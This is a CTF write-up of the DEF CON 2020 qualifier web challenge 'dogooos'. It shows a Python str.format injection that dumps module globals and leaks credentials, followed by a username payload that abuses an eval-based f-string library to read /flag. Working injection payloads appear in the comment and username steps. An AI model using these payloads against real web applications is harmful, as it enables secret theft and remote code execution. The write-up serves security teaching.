# DEF CON CTF Qualifier 2020 – dogooos

* **Category:** web
* **Points:** 151

## Challenge

> DogOOOs is a new website where members can rate pictures of dogs. We think there might still be a few bugs, can you check it out? In this challenge, the flag is located in the root directory of the server at /flag.
> 
> http://dogooos.challenges.ooo:37453
> 
> dogooos.challenges.ooo 37453
> 
> Files:
> 
> [dogooo_comments.py](dogooo_comments.py) a881e06d1d70809ffdc9149a5be5b5de6796542f2ed2225fd43d451fde2c8c78
> 
> [loaddata.py](loaddata.py) 0b57622ec86e02c0d8726538161dffb1e13ba1a18b7538354c12f762e4947c23

[Official solution here.](https://github.com/o-o-overflow/dc2020q-dogooos-public)

## Solution

The website allows you to upload and comment pictures of dogs.

There is an interesting endpoint at `/dogooo/runcmd` that contains a remote shell functionality, but it can't be used due to an `HTTP 502 Bad Gateway` error caused by the presence of `seccomp` filter, which prevents `execve`.

Several functionalities can be used only by authenticated users (i.e. `@login_required` annotations). There is an endpoint that can be used to create new users (i.e. `/dogooo/user/create`), but even this functionality requires the login.

A public functionality is the `/dogooo/deets/<postid>` that can be used to insert a new comment under a picture.

The comment is inserted with a two-step procedure:
1. the comment is inserted like a preview and showed into the webpage;
2. the content of the comment is strictly validated and inserted into the database.

Analyzing the code for the first step, in the [loaddata.py](loaddata.py) file, an interesting line of code can be found into `get_comments` function.

```python
def get_comments(self):
    out = ""
    for ccnt, cmt in enumerate(self.comments):
        fmt_cmt = cmt.comment.format(rating=self.__dict__)
        form_save = f"""
            <form action="/dogooo/deets/add/{self.id}" method="POST">
                <input type=hidden id="comment" name="comment" value='{fmt_cmt}'></textarea>
                <input type=hidden id="commenter" name="commenter" value='{cmt.author}'/>
                <input type=submit value="Save" />
            </form>
        """
        if cmt.preview:
            out += f"<ul class='square'>{fmt_cmt} - {cmt.author} {form_save} </ul>\n"
        else:
            out += f"<ul class='square'>{fmt_cmt} - {cmt.author}</ul>\n"

    return out
```

The interesting line is the following.

```
fmt_cmt = cmt.comment.format(rating=self.__dict__)
```

It seems that if you use a format string like `{rating}` into the comment text, then the content of `self.__dict__` can be printed.

Trying it, the following content will be printed into the preview webpage.

```html
<ul class='square'>{'id': 3, 'rating': 13, '_message': "This is Griffey. His St. Patrick's Day bow tie didn't arrive until this morning. Politely requests that everyone celebrate again. 13/10", 'pic_loc': 'images/img_3.jpg', 'author': 'demidog', 'comments': [<app.loaddata.Comment object at 0x7fc4eaadf160>, <app.loaddata.Comment object at 0x7fc4eaadf1f0>, <app.loaddata.Comment object at 0x7fc4eaadf1c0>, <app.loaddata.Comment object at 0x7fc4eaadf280>, <app.loaddata.Comment object at 0x7fc4eaadf3d0>, <app.loaddata.Comment object at 0x7fc4eaadf430>, <app.loaddata.Comment object at 0x7fc4eaadf490>, <app.loaddata.Comment object at 0x7fc4eaadf4f0>, <app.loaddata.Comment object at 0x7fc4eaadf550>, <app.loaddata.Comment object at 0x7fc4eaadf5b0>, <app.loaddata.Comment object at 0x7fc4eaadf610>, <app.loaddata.Comment object at 0x7fc4eaadf670>, <app.loaddata.Comment object at 0x7fc4eaadf6d0>, <app.loaddata.Comment object at 0x7fc4eaadf730>, <app.loaddata.Comment object at 0x7fc4eaadf790>, <app.loaddata.Comment object at 0x7fc4eaadf7f0>, <app.loaddata.Comment object at 0x7fc4eaadf850>, <app.loaddata.Comment object at 0x7fc4eaadf8b0>, <app.loaddata.Comment object at 0x7fc4eaadf910>, <app.loaddata.Comment object at 0x7fc4eaadf970>, <app.loaddata.Comment object at 0x7fc4eaadf9d0>, <app.loaddata.Comment object at 0x7fc4eaadfa30>, <app.loaddata.Comment object at 0x7fc4eaadfa90>, <app.loaddata.Comment object at 0x7fc4eaadfaf0>, <app.loaddata.Comment object at 0x7fc4eaadfb50>, <app.loaddata.Comment object at 0x7fc4eaadfbb0>, <app.loaddata.Comment object at 0x7fc4eaadfc10>, <app.loaddata.Comment object at 0x7fc4eaadfc70>, <app.loaddata.Comment object at 0x7fc4eaadfcd0>, <app.loaddata.Comment object at 0x7fc4eaadfd30>, <app.loaddata.Comment object at 0x7fc4eaadfd90>, <app.loaddata.Comment object at 0x7fc4eaadfdf0>, <app.loaddata.Comment object at 0x7fc4eaadfe50>, <app.loaddata.Comment object at 0x7fc4eaadfeb0>, <app.loaddata.Comment object at 0x7fc4eaadff10>, <app.loaddata.Comment object at 0x7fc4eaadff70>, <app.loaddata.Comment object at 0x7fc4eaadffd0>, <app.loaddata.Comment object at 0x7fc4eaae6070>, <app.loaddata.Comment object at 0x7fc4eaae60d0>, <app.loaddata.Comment object at 0x7fc4eaae6130>, <app.loaddata.Comment object at 0x7fc4eaae6190>, <app.loaddata.Comment object at 0x7fc4eaae61f0>, <app.loaddata.Comment object at 0x7fc4eaae6250>, <app.loaddata.Comment object at 0x7fc4eaae62b0>, <app.loaddata.Comment object at 0x7fc4eaae6310>, <app.loaddata.Comment object at 0x7fc4eaae6370>, <app.loaddata.Comment object at 0x7fc4eaae63d0>, <app.loaddata.Comment object at 0x7fc4eaae6430>, <app.loaddata.Comment object at 0x7fc4eaae6490>, <app.loaddata.Comment object at 0x7fc4eaae64f0>, <app.loaddata.Comment object at 0x7fc4eaae6550>, <app.loaddata.Comment object at 0x7fc4eaae65b0>, <app.loaddata.Comment object at 0x7fc4eaae6610>, <app.loaddata.Comment object at 0x7fc4eaae6670>, <app.loaddata.Comment object at 0x7fc4eaae66d0>, <app.loaddata.Comment object at 0x7fc4eaae6730>, <app.loaddata.Comment object at 0x7fc4eaae6790>, <app.loaddata.Comment object at 0x7fc4eaae67f0>, <app.loaddata.Comment object at 0x7fc4eaae6850>, <app.loaddata.Comment object at 0x7fc4eaae68b0>, <app.loaddata.Comment object at 0x7fc4eaae6910>, <app.loaddata.Comment object at 0x7fc4eaae6970>, <app.loaddata.Comment object at 0x7fc4eaae69d0>, <app.loaddata.Comment object at 0x7fc4eaae6a30>, <app.loaddata.Comment object at 0x7fc4eaae6a90>, <app.loaddata.Comment object at 0x7fc4eaae6af0>, <app.loaddata.Comment object at 0x7fc4eaae6b50>, <app.loaddata.Comment object at 0x7fc4eaae6bb0>, <app.loaddata.Comment object at 0x7fc4eaae6c10>, <app.loaddata.Comment object at 0x7fc4eaae6c70>, <app.loaddata.Comment object at 0x7fc4eaae6cd0>, <app.loaddata.Comment object at 0x7fc4eaae6d30>, <app.loaddata.Comment object at 0x7fc4eaae6d90>, <app.loaddata.Comment object at 0x7fc4eaae6df0>, <app.loaddata.Comment object at 0x7fc4eab30af0>]} - author
```

As you can read [here](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/), this code can be abused to read secret data.

The following code can be used to access *globals* objects.

```python
{rating[comments][0].__class__.__init__.__globals__}
```

It will give the following output.

```html
<ul class='square'>{'__name__': 'app.loaddata', '__doc__': None, '__package__': 'app', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fc4ed1f4670>, '__spec__': ModuleSpec(name='app.loaddata', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7fc4ed1f4670>, origin='./app/loaddata.py'), '__file__': './app/loaddata.py', '__cached__': './app/__pycache__/loaddata.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2020 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'connect': <function Connect at 0x7fc4ed0c4700>, 'f': <class 'fstring.fstring.fstring'>, 'clean': <function clean at 0x7fc4ed09f310>, 'json': <module 'json' from '/usr/lib/python3.8/json/__init__.py'>, 'post_results': ((3, "This is Griffey. His St. Patrick's Day bow tie didn't arrive until this morning. Politely requests that everyone celebrate again. 13/10", 2, 13, 'images/img_3.jpg', 2, 'demidog', 'princesses_password'),), 'jf': <_io.TextIOWrapper name='/dbcreds.json' mode='r' encoding='UTF-8'>, 'jdata': {'db_user': 'dogooo', 'db_pass': 'dogZgoneWild'}, 'db_user': 'dogooo', 'db_pass': 'dogZgoneWild', 'Comment': <class 'app.loaddata.Comment'>, 'Post': <class 'app.loaddata.Post'>, 'get_posting': <function get_posting at 0x7fc4ed1fe940>, 'UserMixin': <class 'flask_login.mixins.UserMixin'>, 'save_comment': <function save_comment at 0x7fc4eb2819d0>, 'get_all_posts': <function get_all_posts at 0x7fc4eb281af0>, 'create_post_entry': <function create_post_entry at 0x7fc4eab0c0d0>, 'User': <class 'app.loaddata.User'>, 'user_create_entry': <function user_create_entry at 0x7fc4eab1c040>, 'get_login': <function get_login at 0x7fc4eab1c280>, 'get_user': <function get_user at 0x7fc4eab1c310>} - author
```

From this data you can spot user credentials:
* username: `demidog`;
* password: `princesses_password`;

So now you can authenticate into the system and **you can create new users**.

During the authentication, an interesting behavior can be spot. The `login` method ([dogooo_comments.py](dogooo_comments.py)) uses the *f-Strings* functionality of Python 3, [which is a very powerful formatting syntax](https://realpython.com/python-f-strings/) and can be used to call methods.

```python
@app.route("/dogooo/login", methods=["GET", "POST"])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_login(username, password)
        if user is not None:
            login_user(user)
            return redirect(request.host_url[:-1] + f"/dogooo/show?message=Welcom+back+{user.get_user_info()}")

        else:
            return redirect(request.host_url[:-1] + f"/dogooo/show?message=Login+FAILED")
    else:
        return abort(401)
```

The interesting line is the following.

```python
return redirect(request.host_url[:-1] + f"/dogooo/show?message=Welcom+back+{user.get_user_info()}")
```

The `get_user_info` method of the `User` class into [loaddata.py](loaddata.py) uses the `f()` method, instead of the `f""` one, on the `username` field; this method is the legacy one of *f-Strings* Python 2 implementation. The library implemented the *f-Strings* functionality by using an `eval`.

```python
from fstring import fstring as f
...   ...   ...
def get_user_info(self):
    return f(self.username)
```

So you can create a new user with a malicious username that could trigger a RCE during the authentication. The malicious username is: `{open('/flag').read()}`.

Authenticating with this user, you will be redirect to the following address.

```
http://dogooos.challenges.ooo:37453/dogooo/show?message=Welcom+back+OOO%7Bdid%20you%20see%20my%20dog%7D
```

Which contains the flag in the URL.

![flag.png](flag.png)

So the flag is the following.

```
OOO{did you see my dog}
```